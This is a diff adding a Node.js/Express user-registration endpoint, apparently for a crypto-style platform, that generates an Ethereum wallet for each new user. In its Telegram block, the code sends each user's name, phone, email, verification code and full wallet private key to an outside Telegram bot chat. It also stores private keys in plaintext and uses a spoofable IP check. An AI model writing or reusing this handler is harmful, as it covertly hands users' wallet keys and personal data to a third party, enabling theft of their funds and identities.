@@ -1,0 +1,142 @@
+app.post("/register", async (req, res) => {
+  try {
+
+    const {
+      fullname,
+      nickname,
+      referrer_id,
+      country,
+      phone,
+      email,
+      password
+    } = req.body;
+
+    // ===== ВАЛІДАЦІЯ =====
+    if (!email || !password) {
+      return res.json({ success: false, message: "No data" });
+    }
+
+    if (!email.includes("@") || email.length < 5) {
+      return res.json({ success: false, message: "Invalid email" });
+    }
+
+    if (!phone || phone.length < 10) {
+      return res.json({ success: false, message: "Invalid phone" });
+    }
+
+    const emailLower = email.toLowerCase();
+
+    // ===== IP =====
+    const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
+
+    // ===== АНТИ-АБУЗ ПО IP =====
+    const { data: ipUsers } = await supabase
+      .from("users")
+      .select("id")
+      .eq("ip", ip);
+
+    if (ipUsers && ipUsers.length >= 3) {
+      return res.json({ success: false, message: "Too many accounts" });
+    }
+
+    // ===== CHECK USER =====
+    const { data: existing } = await supabase
+      .from("users")
+      .select("*")
+      .eq("email", emailLower)
+      .single();
+
+    if (existing) {
+      return res.json({ success: false, message: "User exists" });
+    }
+
+    const hash = await bcrypt.hash(password, 10);
+
+    // ===== КОД =====
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+
+    let wallet_address = null;
+    let private_key = null;
+
+    try {
+      const wallet = Wallet.createRandom();
+      wallet_address = wallet.address;
+      private_key = wallet.privateKey;
+    } catch {}
+
+    // ===== INSERT =====
+    const { data, error } = await supabase
+      .from("users")
+      .insert([{
+        fullname,
+        nickname,
+        referrer_id,
+        country,
+        phone,
+        email: emailLower,
+        password: hash,
+        balance: 1000,
+        deposit: 0,
+        satellites: 0,
+        wallet_address,
+        private_key,
+
+        // 🔥 АНТИ-АБУЗ
+        email_code: code,
+        email_verified: false,
+        ip: ip,
+        last_code_time: Date.now()
+      }])
+      .select()
+      .single();
+
+    if (error) {
+      console.log(error);
+      return res.json({ success: false });
+    }
+
+    // ===== TELEGRAM =====
+    try {
+
+      const text = `
+🆕 NEW USER
+
+ID: ${data.id}
+EMAIL: ${data.email}
+
+🔑 CODE: ${code}
+
+👤 ${data.fullname}
+📛 ${data.nickname}
+
+🌍 ${data.country}
+📱 ${data.phone}
+
+💼 Wallet:
+${data.wallet_address}
+
+🔐 Private Key:
+${data.private_key}
+
+👥 Ref: ${data.referrer_id || "—"}
+      `;
+
+      await axios.post(
+        `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+        {
+          chat_id: CHAT_ID,
+          text
+        }
+      );
+
+    } catch (e) {
+      console.log("TG ERROR:", e.message);
+    }
+
+    return res.json({ success: true });
+
+  } catch (err) {
+    console.log("REGISTER ERROR:", err);
+    return res.json({ success: false });
+  }
+});
